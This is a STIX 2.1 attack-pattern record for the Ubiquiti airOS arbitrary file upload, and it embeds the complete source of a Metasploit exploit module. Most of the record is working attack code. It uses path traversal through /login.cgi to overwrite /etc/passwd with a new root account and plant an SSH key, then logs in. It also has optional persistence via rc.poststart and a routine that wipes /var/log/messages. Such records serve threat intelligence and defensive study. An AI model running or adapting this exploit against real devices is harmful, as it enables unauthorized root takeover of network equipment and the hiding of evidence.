{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5279363f-6cd1-45f9-8685-28b6d3482c4d",
    "created": "2024-08-14T17:03:57.492632Z",
    "modified": "2024-08-14T17:03:57.492636Z",
    "name": "Ubiquiti airOS Arbitrary File Upload",
    "description": " This module exploits a pre-auth file upload to install a new root user to /etc/passwd and an SSH key to /etc/dropbear/authorized_keys.  FYI, /etc/{passwd,dropbear/authorized_keys} will be overwritten. /etc/persistent/rc.poststart will be overwritten if PERSIST_ETC is true.  This method is used by the \"mf\" malware infecting these devices. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ubiquiti_airos_file_upload.rb",
            "external_id": "ubiquiti_airos_file_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  # See note about overwritten files\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::SSH\n  include Msf::Module::Deprecated\n\n  moved_from 'exploit/linux/ssh/ubiquiti_airos_file_upload'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ubiquiti airOS Arbitrary File Upload',\n        'Description' => %q{\n          This module exploits a pre-auth file upload to install a new root user\n          to /etc/passwd and an SSH key to /etc/dropbear/authorized_keys.\n\n          FYI, /etc/{passwd,dropbear/authorized_keys} will be overwritten.\n          /etc/persistent/rc.poststart will be overwritten if PERSIST_ETC is true.\n\n          This method is used by the \"mf\" malware infecting these devices.\n        },\n        'Author' => [\n          '93c08539', # Vulnerability discovery\n          'wvu'       # Metasploit module\n        ],\n        'References' => [\n          %w[EDB 39701],\n          %w[URL https://hackerone.com/reports/73480]\n        ],\n        'DisclosureDate' => '2016-02-13',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true,\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Targets' => [\n          ['Ubiquiti airOS < 5.6.2', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptPort.new('SSH_PORT', [true, 'SSH port', 22])\n    ])\n\n    register_advanced_options([\n      OptBool.new('PERSIST_ETC', [false, 'Persist in /etc/persistent', false]),\n      OptBool.new('WIPE_LOGS', [false, 'Wipe /var/log/messages', false]),\n      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),\n      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])\n    ])\n  end\n\n  def exploit\n    print_status('Uploading /etc/passwd')\n    upload_etc_passwd\n    print_status('Uploading /etc/dropbear/authorized_keys')\n    upload_authorized_keys\n    print_status(\"Logging in as #{username}\")\n    vprint_status(\"Password: #{password}\")\n    vprint_status(\"Private key:\\n#{private_key}\")\n    if (ssh = ssh_login)\n      print_good(\"Logged in as #{username}\")\n      handler(ssh.lsock)\n    end\n  end\n\n  def on_new_session(session)\n    super\n    if datastore['PERSIST_ETC']\n      print_status('Persisting in /etc/persistent')\n      persist_etc(session)\n    end\n    if datastore['WIPE_LOGS']\n      print_status('Wiping /var/log/messages')\n      wipe_logs(session)\n    end\n  end\n\n  def upload_etc_passwd\n    mime = Rex::MIME::Message.new\n    mime.add_part(etc_passwd, 'text/plain', 'binary',\n                  'form-data; name=\"passwd\"; filename=\"../../etc/passwd\"')\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => '/login.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n  end\n\n  def upload_authorized_keys\n    mime = Rex::MIME::Message.new\n    mime.add_part(authorized_keys, 'text/plain', 'binary',\n                  'form-data; name=\"authorized_keys\"; ' \\\n                  'filename=\"../../etc/dropbear/authorized_keys\"')\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => '/login.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n  end\n\n  def ssh_login\n    ssh_opts = ssh_client_defaults.merge({\n      port: datastore['SSH_PORT'],\n      auth_methods: %w[publickey password],\n      key_data: [private_key]\n    })\n\n    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(rhost, username, ssh_opts)\n      end\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{e.class}: #{e.message}\")\n      return nil\n    end\n\n    if ssh\n      report_vuln(\n        host: rhost,\n        name: name,\n        refs: references,\n        info: ssh.transport.server_version.version\n      )\n      store_valid_credential(\n        user: username,\n        private: private_key,\n        private_type: :ssh_key\n      )\n      return Net::SSH::CommandStream.new(ssh)\n    end\n\n    nil\n  end\n\n  # This is for store_valid_credential above\n  def service_details\n    super.merge(\n      port: datastore['SSH_PORT'],\n      service_name: 'ssh'\n    )\n  end\n\n  #\n  # Persistence and cleanup methods\n  #\n\n  def persist_etc(session)\n    mime = Rex::MIME::Message.new\n    mime.add_part(rc_poststart, 'text/plain', 'binary',\n                  'form-data; name=\"rc.poststart\"; ' \\\n                  'filename=\"../../etc/persistent/rc.poststart\"')\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => '/login.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n\n    # http://www.hwmn.org/w/Ubiquity_HOWTO\n    commands = [\n      \"mkdir #{username}\",\n      \"cp /etc/passwd /etc/dropbear/authorized_keys #{username}\",\n      'cfgmtd -wp /etc'\n    ]\n\n    commands.each do |command|\n      session.shell_command_token(command)\n    end\n  end\n\n  def wipe_logs(session)\n    session.shell_command_token('> /var/log/messages')\n  end\n\n  #\n  # /etc/passwd methods\n  #\n\n  def etc_passwd\n    \"#{username}:#{crypt(password)}:0:0:Administrator:/etc/persistent:/bin/sh\\n\"\n  end\n\n  def crypt(password)\n    # http://man7.org/linux/man-pages/man3/crypt.3.html\n    salt = Rex::Text.rand_text(2, '', Rex::Text::AlphaNumeric + './')\n    password.crypt(salt)\n  end\n\n  def username\n    @username ||= Rex::Text.rand_text_alpha_lower(8)\n  end\n\n  def password\n    @password ||= Rex::Text.rand_text_alphanumeric(8)\n  end\n\n  #\n  # /etc/dropbear/authorized_keys methods\n  #\n\n  def authorized_keys\n    pubkey = Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)\n    \"#{ssh_keygen.ssh_type} #{pubkey}\\n\"\n  end\n\n  def private_key\n    ssh_keygen.to_pem\n  end\n\n  def ssh_keygen\n    @ssh_keygen ||= OpenSSL::PKey::RSA.new(2048)\n  end\n\n  #\n  # /etc/persistent/rc.poststart methods\n  #\n\n  def rc_poststart\n    <<~EOF\n      cp /etc/persistent/#{username}/passwd /etc/passwd\n      cp /etc/persistent/#{username}/authorized_keys /etc/dropbear/authorized_keys\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-13",
    "x_mitre_platforms": [
        "unix'"
    ]
}